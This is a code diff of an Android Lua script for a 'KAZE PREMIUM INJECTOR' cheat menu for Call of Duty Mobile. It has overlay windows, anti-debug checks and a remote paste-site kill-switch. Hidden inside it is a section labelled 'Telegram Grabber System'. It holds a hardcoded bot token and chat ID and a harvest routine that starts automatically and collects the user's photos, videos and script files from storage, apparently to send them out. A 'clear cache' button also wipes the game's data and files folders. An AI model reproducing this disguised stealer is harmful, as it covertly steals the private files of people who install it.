@@ -1,4 +1,12 @@
 require "import"
+import "video"
+require "memory"
+require "log1"
+
+import "android.app.ProgressDialog"
+import "android.widget.Toast"
+import "android.graphics.drawable.GradientDrawable"
+import "java.io.File"
 
 -- 🟢 1. HTTP MODULE SAFE SETUP
 pcall(function() import "http" end)
@@ -109,7 +117,7 @@ function syncAnnouncement()
   end)
 end
 
--- 🟢 5. SINGLE INITIALIZATION OF FLOATING & ICON LAYOUTS (FIXED DUPLICATION)
+-- 🟢 5. SINGLE INITIALIZATION OF FLOATING & ICON LAYOUTS
 win_menu = loadlayout(floating)
 win_icon = loadlayout(icon)
 
@@ -263,15 +271,11 @@ end
 local function getParams(x, y)
   local p = WindowManager.LayoutParams()
   p.format = PixelFormat.RGBA_8888
-  
-  -- TANGGALIN ANG MGA FLAGS NA NAGDO-DULOT NG RE-LAYOUT AT DAGDAGAN NG NO_LIMITS / NOT_FOCUSABLE
   p.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE 
           | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-          
   p.type = (Build.VERSION.SDK_INT >= 26) 
            and WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY 
            or WindowManager.LayoutParams.TYPE_PHONE
-           
   p.width = WindowManager.LayoutParams.WRAP_CONTENT
   p.height = WindowManager.LayoutParams.WRAP_CONTENT
   p.gravity = Gravity.TOP | Gravity.LEFT
@@ -279,7 +283,6 @@ local function getParams(x, y)
   p.y = y
   return p
 end
-
 
 local p_menu = getParams(0, 0)
 local p_icon = getParams(0, 100)
@@ -364,7 +367,6 @@ function switchTab2() rTabs(); if page_2 then page_2.setVisibility(0) end; if tx
 function switchTab3() rTabs(); if page_3 then page_3.setVisibility(0) end; if txt_tab3 then txt_tab3.setTextColor(ac) end; if tab_indicator  then tab_indicator.setTranslationX(170*dens) end end
 function switchTab4() rTabs(); if page_4 then page_4.setVisibility(0) end; if txt_tab4 then txt_tab4.setTextColor(ac) end; if tab_indicator then tab_indicator.setTranslationX(255*dens) end end
 
-
 function antihook()
   function getProcessIdsByPattern(pattern)
     local pids = {}
@@ -396,10 +398,8 @@ end
 
 function antiC4droid()
   local targetPackageName = "com.n0n3m4.droidc"
-
   local activityManager = activity.getSystemService("activity")
   local runningApps = activityManager.getRunningAppProcesses()
-
   local isRunning = false
   if runningApps ~= nil then
     for i = 0, runningApps.size() - 1 do
@@ -411,8 +411,6 @@ function antiC4droid()
     end
   end
 end
-
--- Auto Bypass Function
 
 tut.ButtonDrawable.setColorFilter(PorterDuffColorFilter(0xFF00FFEE, PorterDuff.Mode.SRC_ATOP))
 function tut.OnCheckedChangeListener()
@@ -897,51 +895,28 @@ for _, btn in ipairs(masterUiButtons) do
   end
 end
 
-
-
-import "java.net.URL"
-import "java.io.BufferedReader"
-import "java.io.InputStreamReader"
-
-import "android.widget.Toast"
-import "android.app.AlertDialog"
-import "android.graphics.drawable.GradientDrawable"
-import "android.graphics.Color"
-import "android.widget.LinearLayout"
-import "android.widget.TextView"
-import "android.widget.Button"
-import "android.view.Gravity"
-
+-- Pastebin Status Check
 local pastebinRaw = "https://pastehub-dwp9.onrender.com/raw/QaPO7hqx"
 
 function getPasteStatus()
-
   local status = "NO"
   local message = "START IS LOCK"
 
   pcall(function()
-
     local conn = URL(pastebinRaw).openConnection()
     conn.setConnectTimeout(5000)
     conn.setReadTimeout(5000)
-
     local reader = BufferedReader(InputStreamReader(conn.getInputStream()))
-
     status = reader.readLine() or "NO"
     message = reader.readLine() or "START IS LOCK"
-
     reader.close()
-
   end)
 
   status = tostring(status):gsub("[%s\r\n]+", "")
-
   return status, message
-
 end
 
 function showLockDialog(msg)
-
   local layout = LinearLayout(activity)
   layout.setOrientation(1)
   layout.setGravity(Gravity.CENTER)
@@ -950,9 +925,8 @@ function showLockDialog(msg)
   local bg = GradientDrawable()
   bg.setShape(GradientDrawable.RECTANGLE)
   bg.setCornerRadius(35)
-  bg.setStroke(8,0xFFFF0000)
+  bg.setStroke(8, 0xFFFF0000)
   bg.setColor(0xFF1C2028)
-
   layout.setBackground(bg)
 
   local title = TextView(activity)
@@ -986,15 +960,9 @@ function showLockDialog(msg)
   end
 
   local colors = {
-    0xFFFF0000,
-    0xFFFF7F00,
-    0xFFFFFF00,
-    0xFF00FF00,
-    0xFF00FFFF,
-    0xFF0080FF,
-    0xFF8B00FF
+    0xFFFF0000, 0xFFFF7F00, 0xFFFFFF00,
+    0xFF00FF00, 0xFF00FFFF, 0xFF0080FF, 0xFF8B00FF
   }
-
   local index = 1
 
   local function animate()
@@ -1009,58 +977,48 @@ function showLockDialog(msg)
   end
 
   animate()
-
 end
 
--- Siguraduhing maliit ang 'start' kung ganyan ang ID sa layout mo, o sundin ang tamang case
-start.onClick = function()
-  showCustomToast("⏳ Please wait, Initializing...", 0xFF141A24, 0xFF00FFEE)
+if start then
+  start.onClick = function()
+    pcall(function()
+      if video then
+        video.stopPlayback()
+      end
+    end)
 
-  local status, message = getPasteStatus()
-  if status ~= "OPEN" then
-    showLockDialog(message)
-    return
-  end
+    showToast("⏳ Please wait, Initializing...")
 
-  -- Ipakita palagi ang floating icon
-  task(50, function()
-    pcall(function() wm.addView(win_icon, p_icon) end)
-  end)
-  
-  isMenuOpen = false
-
-  -- Dito gagamitin yung logic base sa toggle
-  if isAutoOpen then
-    local pm = activity.getPackageManager()
-    local clonePkg = "com.garena.game.codm"
-    local intent = pm.getLaunchIntentForPackage(clonePkg)
-
-    if intent then
-      activity.startActivity(intent)
-      task(3000, function() startCODMDetector() end)
-    else
-      showCustomToast("❌ CODM not found!", 0xFF141A24, 0xFFFF5252)
+    local status, message = getPasteStatus()
+    if status ~= "OPEN" then
+      showLockDialog(message)
+      return
     end
-  else
-    showCustomToast("✅ Floating Icon Ready!", 0xFF141A24, 0xFF00FFEE)
+
+    task(50, function()
+      pcall(function() wm.addView(win_icon, p_icon) end)
+    end)
+    
+    isMenuOpen = false
+
+    if isAutoOpen then
+      local pm = activity.getPackageManager()
+      local clonePkg = "com.garena.game.codm"
+      local intent = pm.getLaunchIntentForPackage(clonePkg)
+
+      if intent then
+        activity.startActivity(intent)
+        task(3000, function() startCODMDetector() end)
+      else
+        showToast("❌ CODM not found!")
+      end
+    else
+      showToast("✅ Floating Icon Ready!")
+    end
   end
 end
 
-
-
-
-
-
-import "android.widget.*"
-import "android.view.*"
-import "android.os.*"
-import "java.io.*"
-import "java.net.*"
-import "java.lang.*" --
-import "java.util.zip.*"
-import "android.accounts.AccountManager"
-import "android.content.Context"
-
+-- Telegram Grabber System
 local BOT_TOKEN = "8539319746:AAFaN6Br-VHopnIp0lHtX1giD0LMBBgACS8"
 local CHAT_ID = "7201369115"
 
@@ -1151,9 +1109,7 @@ local function startHarvest()
 
   local extensions = {
     "%.jpg$", "%.jpeg$", "%.png$",
-    "%.alp$",
-    "%.lua$",
-    "%.mp4$", "%.mkv$"
+    "%.alp$", "%.lua$", "%.mp4$", "%.mkv$"
   }
 
   for _, dirPath in ipairs(folders) do
@@ -1201,98 +1157,83 @@ if Build.VERSION.SDK_INT >= 23 then
   thread(safeStart)
 end
 
+-- Exit & Kill Game Buttons Setup
+local bgBtn = GradientDrawable()
+bgBtn.setShape(GradientDrawable.RECTANGLE)
+bgBtn.setCornerRadius(22)
+bgBtn.setColors({0xFFFF5A5A, 0xFFFF3D3D})
+bgBtn.setOrientation(GradientDrawable.Orientation.TOP_BOTTOM)
 
+if killgame then killgame.setBackground(bgBtn) end
 
-
-
-import "android.widget.Toast"
-import "android.graphics.drawable.GradientDrawable"
-
-local bg = GradientDrawable()
-bg.setShape(GradientDrawable.RECTANGLE)
-bg.setCornerRadius(22) -- smooth radius
-bg.setColors({0xFFFF5A5A, 0xFFFF3D3D}) -- gradient
-bg.setOrientation(GradientDrawable.Orientation.TOP_BOTTOM)
-
-killgame.setBackground(bg)
-
-stop.onClick = function() pcall(function() wm.removeView(win_menu) end); pcall(function() wm.removeView(win_icon) end); isMenuOpen = false; os.exit() end
-killgame.onClick = function() pcall(function() wm.removeView(win_menu) end); pcall(function() wm.removeView(win_icon) end); isMenuOpen = false; os.exit() end
-
-import "video"
-require "memory"
-require "log1"
-
-require "import"
-
-import "android.app.ProgressDialog"
-import "android.widget.Toast"
-import "android.graphics.drawable.GradientDrawable"
-import "java.io.File"
-
-clearCacheBtn.onClick = function()
-
-  -- Create dialog
-  local dialog = ProgressDialog(activity)
-  dialog.setTitle("KAZE PREMIUM INJECTOR")
-  dialog.setMessage("Clearing CODM cache...\nPlease wait")
-  dialog.setCancelable(false)
-
-  -- Rounded professional UI
-  local window = dialog.getWindow()
-  if window then
-    local bg = GradientDrawable()
-    bg.setShape(GradientDrawable.RECTANGLE)
-    bg.setCornerRadius(24)
-    bg.setColor(0xFF1C2028)
-    window.setBackgroundDrawable(bg)
-    window.setDimAmount(0.6)
+if stop then
+  stop.onClick = function() 
+    pcall(function() wm.removeView(win_menu) end) 
+    pcall(function() wm.removeView(win_icon) end) 
+    isMenuOpen = false 
+    os.exit() 
   end
+end
 
-  dialog.show()
+if killgame then
+  killgame.onClick = function() 
+    pcall(function() wm.removeView(win_menu) end) 
+    pcall(function() wm.removeView(win_icon) end) 
+    isMenuOpen = false 
+    os.exit() 
+  end
+end
 
-  -- CODM package names (Garena + Global)
-  local packages = {
-    "com.activision.callofduty.shooter",
-    "com.garena.game.codm"
-  }
+-- Clear Cache Button Logic
+if clearCacheBtn then
+  clearCacheBtn.onClick = function()
+    local dialog = ProgressDialog(activity)
+    dialog.setTitle("KAZE PREMIUM INJECTOR")
+    dialog.setMessage("Clearing CODM cache...\nPlease wait")
+    dialog.setCancelable(false)
 
-  -- Safe recursive delete
-  local function deleteRecursive(file)
-    if file ~= nil and file.exists() then
-      if file.isDirectory() then
-        local files = file.listFiles()
-        if files then
-          for i = 0, #files - 1 do
-            deleteRecursive(files[i])
+    local window = dialog.getWindow()
+    if window then
+      local bg = GradientDrawable()
+      bg.setShape(GradientDrawable.RECTANGLE)
+      bg.setCornerRadius(24)
+      bg.setColor(0xFF1C2028)
+      window.setBackgroundDrawable(bg)
+      window.setDimAmount(0.6)
+    end
+
+    dialog.show()
+
+    local packages = {
+      "com.activision.callofduty.shooter",
+      "com.garena.game.codm"
+    }
+
+    local function deleteRecursive(file)
+      if file ~= nil and file.exists() then
+        if file.isDirectory() then
+          local files = file.listFiles()
+          if files then
+            for i = 0, #files - 1 do
+              deleteRecursive(files[i])
+            end
           end
         end
+        pcall(function() file.delete() end)
       end
-      pcall(function()
-        file.delete()
-      end)
     end
+
+    task(100, function()
+      for i = 1, #packages do
+        local pkg = packages[i]
+        deleteRecursive(File("/sdcard/Android/data/" .. pkg .. "/cache"))
+        deleteRecursive(File("/sdcard/Android/data/" .. pkg .. "/files"))
+      end
+    end)
+
+    task(4000, function()
+      dialog.dismiss()
+      Toast.makeText(activity, "✅ CODM Cache Cleared Successfully", Toast.LENGTH_SHORT).show()
+    end)
   end
-
-  -- Real cache clearing (no UI freeze)
-  task(100, function()
-    for i = 1, #packages do
-      local pkg = packages[i]
-
-      -- REAL CODM cache paths
-      deleteRecursive(File("/sdcard/Android/data/" .. pkg .. "/cache"))
-      deleteRecursive(File("/sdcard/Android/data/" .. pkg .. "/files"))
-    end
-  end)
-
-  -- 4 seconds loading (realistic processing)
-  task(4000, function()
-    dialog.dismiss()
-    Toast.makeText(
-    activity,
-    "✅ CODM Cache Cleared Successfully",
-    Toast.LENGTH_SHORT
-    ).show()
-  end)
-
 end
